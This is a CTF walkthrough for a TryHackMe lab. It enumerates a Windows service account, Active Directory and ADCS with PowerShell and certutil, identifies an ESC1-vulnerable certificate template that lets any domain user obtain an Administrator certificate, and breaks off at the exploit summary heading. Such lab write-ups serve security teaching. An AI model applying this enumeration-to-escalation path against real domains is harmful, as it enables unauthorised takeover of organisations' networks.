# Tryhackme room Rubber Stamp https://tryhackme.com/room/rubberstamp
# Youtube video walk through: https://youtu.be/d7N3ouYnJQY

rubberstamp\svc-iisweb

The path to root was not a local Windows privilege escalation. It was:
```
svc-iisweb
  -> AD enumeration
  -> ADCS discovery
  -> vulnerable certificate template (ESC1)
  -> request Administrator certificate
  -> PKINIT
  -> Administrator NT hash
  -> read root.txt
```
## 1. Baseline: who am I, where am I?

whoami
hostname
whoami /priv
whoami /groups
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
ipconfig /all
klist

Expected results

rubberstamp\svc-iisweb
SRV01

Privileges:

SeMachineAccountPrivilege        Disabled
SeChangeNotifyPrivilege          Enabled
SeIncreaseWorkingSetPrivilege    Disabled

No SeImpersonatePrivilege. That immediately makes classic Potato-style local privesc unlikely.

Groups included:

Everyone
BUILTIN\Users
Pre-Windows 2000 Compatible Access
Certificate Service DCOM Access
NT AUTHORITY\BATCH
CONSOLE LOGON
Authenticated Users
This Organization
IIS_IUSRS
LOCAL

Two useful signals:

1. No local admin group membership.
2. Certificate Service DCOM Access hints that this account may interact with ADCS.

klist showed a cached TGT for svc-iisweb, which is normal for an IIS app-pool identity and useful later for Kerberos operations.

Conclusion

Local privilege escalation is not obvious. Pivot to Active Directory.

## 2. Basic local privesc checks

Before going to AD, rule out the easy local paths:

whoami /priv
- No SeImpersonate / SeAssignPrimaryToken
- No SeDebug
- No SeBackup / SeRestore
- No SeTakeOwnership

Check writable locations:

icacls C:\badr
icacls C:\Users\Public

We found C:\badr writable by BUILTIN\Users, which is useful as a drop directory, but not a privilege escalation by itself.

Check for obvious credential files:

Get-ChildItem C:\Users\Public -Recurse -ErrorAction SilentlyContinue
Get-ChildItem C:\badr -Recurse -ErrorAction SilentlyContinue

We found:
C:\Users\Public\user.txt
C:\badr\badr-info


Conclusion

No easy local privilege escalation. Enumerate the domain.

## 3. Domain enumeration

Check the domain:

Get-ADDomain | Select DNSRoot,NetBIOSName,DomainSID

Expected:

DNSRoot      : rubberstamp.local
NetBIOSName  : RUBBERSTAMP

Enumerate users:
``
Get-ADUser -Filter * `
  -Properties ServicePrincipalNames,MemberOf,PasswordLastSet,AdminCount,Description |
Select SamAccountName,ServicePrincipalNames,MemberOf,PasswordLastSet,AdminCount,Description |
Format-Table -AutoSize
``

Look at Domain Admins:
```
Get-ADGroupMember "Domain Admins" | Select SamAccountName,objectClass
```

Expected:

Administrator   user

Only the built-in Administrator is a Domain Admin.

Check for Kerberoastable accounts:

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
  -Properties ServicePrincipalName |
Select SamAccountName,ServicePrincipalName

Expected:

krbtgt   kadmin/changepw
krbtgt is not useful for Kerberoasting.

Check your own account:
```
Get-ADUser svc-iisweb -Properties ServicePrincipalNames,MemberOf,PasswordLastSet,AdminCount
```

We saw:
- No SPNs
- No group memberships listed
- Password last set recently
- AdminCount blank
  
Conclusion

- No useful Kerberoast target.
- No domain user with obvious admin rights.
- No path through AD group membership.

The next high-value service is ADCS.

## 4. ADCS discovery

Check whether the host is a CA:
```
certutil -config "SRV01.rubberstamp.local\rubberstamp-SRV01-CA" -CAInfo
```

Expected:

CA name: rubberstamp-SRV01-CA
DNS Name: SRV01.rubberstamp.local
List templates the CA can issue:
```
certutil -config "SRV01.rubberstamp.local\rubberstamp-SRV01-CA" -CATemplates
```
Output included:

PrivClientAuth
User
EFS
...

Check the CA policy flags:
```
certutil -getreg policy\EditFlags
```

Expected:

EditFlags REG_DWORD = 11014e

Check for ESC6:

EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x00040000
0x11014e does not contain 0x40000, so ESC6 is not enabled. That is not the path here.

Conclusion

The CA exists and PrivClientAuth is available. Now inspect the template itself.

## 5. Template analysis — this is where ESC1 shows up

Query the template object in AD:
```
$cat = (Get-ADRootDSE).configurationNamingContext
```
```
Get-ADObject `
  -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$cat" `
  -Filter 'objectClass -eq "pKICertificateTemplate"' `
  -Properties msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,msPKI-RA-Signature,pKIExtendedKeyUsage |
Where-Object Name -eq 'PrivClientAuth' |
Format-List Name,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,msPKI-RA-Signature,pKIExtendedKeyUsage
```
```
Expected output:
Name                        : PrivClientAuth
msPKI-Certificate-Name-Flag : 1
msPKI-Enrollment-Flag       : 9
msPKI-RA-Signature          : 0
pKIExtendedKeyUsage         : 1.3.6.1.5.5.7.3.2, 1.3.6.1.5.5.7.3.4, 1.3.6.1.4.1.311.10.3.4
Decode the flags:
msPKI-Certificate-Name-Flag = 1
CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
This means the requester supplies the subject and SAN. This is the core of ESC1.
msPKI-Enrollment-Flag = 9
0x1 = CT_FLAG_AUTO_ENROLLMENT
0x8 = CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS
It does not contain:
0x2 = CT_FLAG_PEND_ALL_REQUESTS
```

So there is no manager approval / pending-request requirement.

msPKI-RA-Signature = 0

No registration authority signature is required.
```
EKUs
1.3.6.1.5.5.7.3.2      Client Authentication
1.3.6.1.5.5.7.3.4      Secure Email
1.3.6.1.4.1.311.10.3.4 Encrypting File System
Client Authentication is the one that makes the certificate usable for PKINIT.
Enrollment permissions
Inspect the template ACL:
```
```
$t = Get-ADObject `
  -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)" `
  -Filter 'Name -eq "PrivClientAuth"' `
  -Properties ntSecurityDescriptor
```
```
$t.ntSecurityDescriptor.Access |
Where-Object {
  $_.ObjectType -eq [guid]"0e10c968-78fb-11d2-90d4-00c04f79dc55"
} |
Select IdentityReference,AccessControlType,ActiveDirectoryRights
```
The relevant enroll extended right is:

0e10c968-78fb-11d2-90d4-00c04f79dc55

We saw Domain Users allowed to enroll.

svc-iisweb is a domain user, so it can request this template.

Conclusion

PrivClientAuth is ESC1:
Requester controls subject/SAN
+ no approval
+ no RA signature
+ Client Authentication EKU
+ Domain Users can enroll
= any domain user can request a certificate for Administrator

## 6. Confirm the other templates are not the path

The other templates either:

- do not allow enrollee-supplied subject (msPKI-Certificate-Name-Flag does not contain 1), or
- do not allow Domain Users to enroll, or
- are machine templates, or
- require approval.

The Administrator template, for example, only allowed Domain Admins / Enterprise Admins to enroll.

So PrivClientAuth is the target.

## 7. Confirm CA web enrollment

From the target shell:
```
Invoke-WebRequest `
  -UseDefaultCredentials `
  -UseBasicParsing `
  -Uri "http://SRV01.rubberstamp.local/certsrv/certrqxt.asp" `
  -TimeoutSec 10
```

Expected:

StatusCode : 200
From the attacker, unauthenticated:
```
curl -i -m 8 http://10.130.129.90/certsrv/
```

Expected:

HTTP/1.1 401 Unauthorized
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
That means the web enrollment site exists and requires Windows authentication.

Why this matters

The normal enrollment paths failed:
- certreq -new / certreq -submit hung.
- Get-Certificate failed with 0x80070002 because the service account has no user profile/key container.
- COM ICertRequest::Submit returned 0x8007000d The data is invalid.
- Machine context failed with CONTEXT_E_ROLENOTFOUND because the template is user-only.
Web enrollment only needs:
- a CSR
- the current user’s Kerberos/NTLM credentials

So it works from svc-iisweb.

## 8. Exploit chain summary
At this point the enumeration has found the vulnerability.
